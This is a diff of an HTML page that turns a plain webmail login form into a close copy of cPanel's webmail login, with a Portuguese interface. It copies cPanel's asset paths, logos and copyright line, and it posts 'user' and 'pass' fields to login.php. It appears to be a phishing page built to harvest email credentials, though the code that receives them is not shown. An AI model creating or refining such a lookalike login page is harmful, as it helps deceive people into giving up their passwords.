@@ -4,53 +4,110 @@
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Webmail</title>
-  <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
+  <link rel="stylesheet" href="static/cPanel_magic_revision_1386192030/unprotected/cpanel/fonts/open_sans/open_sans.min.css">
+  <style>
+    :root{
+      --text:#2b2f33;
+      --muted:#6e767d;
+      --line:#d9dee3;
+      --bg:#ffffff;
+      --btn:#1e96d2;
+      --btn-border:#177fb3;
+      --btn-hover:#178ac4;
+      --placeholder:#9aa3aa;
+    }
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{
+      margin:0;
+      font-family:"Open Sans","Segoe UI",Roboto,Arial,"Helvetica Neue",Helvetica,sans-serif;
+      color:var(--text);
+      background:var(--bg);
+      display:flex;
+      align-items:flex-start;
+      justify-content:center;
+      padding-top:72px;
+    }
+    .wrap{width:100%; max-width:900px; text-align:center}
+
+    .logo{margin:0 auto 20px; width:190px; height:auto; display:block}
+
+    .card{margin:0 auto; width:430px; text-align:left}
+
+    .label{display:block; font-size:13px; font-weight:700; margin:18px 0 6px; color:#3a3f44}
+    .control{position:relative}
+    .icon{position:absolute; left:10px; top:50%; transform:translateY(-50%); width:18px; height:18px; opacity:.8}
+    .input{width:100%; height:38px; border:1px solid var(--line); border-radius:4px; padding:0 12px 0 36px; font-size:13.5px; outline:none; background:#fff; color:var(--text)}
+    .input::placeholder{color:var(--placeholder)}
+    .input:focus{border-color:#c4cbd1; box-shadow:0 0 0 3px rgba(30,150,210,.08)}
+
+    .actions{display:flex; justify-content:center}
+    .btn{margin-top:16px; width:240px; height:36px; border-radius:4px; border:1px solid var(--btn-border); background:linear-gradient(#28a3e1,#1e96d2); color:#fff; font-weight:700; font-size:14px; cursor:pointer}
+    .btn:hover{background:linear-gradient(var(--btn-hover),var(--btn))}
+
+    .langs{margin:40px auto 22px; color:#555e66; font-size:13px; display:flex; gap:22px; justify-content:center; align-items:center; flex-wrap:nowrap; white-space:nowrap}
+    .langs a{color:#555e66; text-decoration:none}
+    .langs a:hover{text-decoration:underline}
+    .langs .dots{letter-spacing:3px}
+
+    .footer{margin-top:6px; text-align:center; color:#6c757d; font-size:12px}
+    .cpanel-logo{display:block; width:26px; height:16px; margin:0 auto 6px}
+    .privacy{display:block; color:#6c757d; text-decoration:none; margin-top:3px}
+    .privacy:hover{text-decoration:underline}
+
+    @media (max-width:520px){
+      body{padding-top:48px}
+      .card{width:90%}
+      .langs{gap:14px; font-size:12px}
+    }
+  </style>
 </head>
 <body>
-  <div class="wrapper">
-    <h1 class="brand">Webmail</h1>
-    <div class="card">
-      <form class="form" method="post" action="/login">
-        <label class="label" for="email">Endereço de email</label>
-        <input class="input" id="email" type="email" name="email" placeholder="Insira seu endereço de email." required>
+  <div class="wrap">
+    <img class="logo" src="static/r1574186984/unprotected/cpanel/images/webmail-logo.svg" alt="Webmail">
 
-        <label class="label" for="password">Senha</label>
-        <input class="input" id="password" type="password" name="password" placeholder="Insira a senha do seu email." required>
-
-        <div style="display:flex;justify-content:center;">
-          <button type="submit" class="btn">Login</button>
-        </div>
-      </form>
-
-      <div class="langs">
-        <a href="#">العربية</a>
-        <a href="#">български</a>
-        <a href="#">čeština</a>
-        <a href="#">dansk</a>
-        <a href="#">Deutsch</a>
-        <a href="#">Ελληνικά</a>
-        <a href="#">English</a>
-        <a href="#">español</a>
-        <a href="#">français</a>
-        <a href="#">italiano</a>
-        <a href="#">magyar</a>
-        <a href="#">Nederlands</a>
-        <a href="#">polski</a>
-        <a href="#">português</a>
-        <a href="#">română</a>
-        <a href="#">русский</a>
-        <a href="#">svenska</a>
-        <a href="#">Türkçe</a>
-        <a href="#">中文</a>
+    <form id="login" class="card" method="post" action="login.php">
+      <label class="label" for="email">Endereço de email</label>
+      <div class="control">
+        <img class="icon" src="static/r1574186984/unprotected/cpanel/images/icon-username.png" alt="">
+        <input class="input" id="email" name="user" type="email" placeholder="Insira seu endereço de email.">
       </div>
 
-      <div class="footer">
-        <div class="cp">
-          <span class="dot" aria-hidden="true"></span>
-          <span>Copyright© 2021, cPanel, L.L.C.</span>
-        </div>
-        <div><a class="small" href="#">Privacy Policy</a></div>
+      <label class="label" for="password">Senha</label>
+      <div class="control">
+        <img class="icon" src="static/r1574186984/unprotected/cpanel/images/icon-password.png" alt="">
+        <input class="input" id="password" name="pass" type="password" placeholder="Insira a senha do seu email.">
       </div>
+
+      <div class="actions">
+        <button class="btn" type="submit">Login</button>
+      </div>
+    </form>
+
+    <div class="langs" aria-label="Idiomas">
+      <a href="#">العربية</a>
+      <span class="dots">···</span>
+      <a href="#">български</a>
+      <span class="dots">···</span>
+      <a href="#">čeština</a>
+      <span class="dots">···</span>
+      <a href="#">dansk</a>
+      <span class="dots">···</span>
+      <a href="#">Deutsch</a>
+      <span class="dots">···</span>
+      <a href="#">Ελληνικά</a>
+      <span class="dots">···</span>
+      <a href="#">English</a>
+      <span class="dots">···</span>
+      <a href="#">español</a>
+      <span class="dots">···</span>
+      <span class="dots">…</span>
+    </div>
+
+    <div class="footer">
+      <img class="cpanel-logo" src="static/r1574186984/unprotected/cpanel/images/cp-logo_white.svg" alt="cPanel">
+      <div>Copyright© 2021, cPanel, L.L.C.</div>
+      <a class="privacy" href="#">Privacy Policy</a>
     </div>
   </div>
 </body>
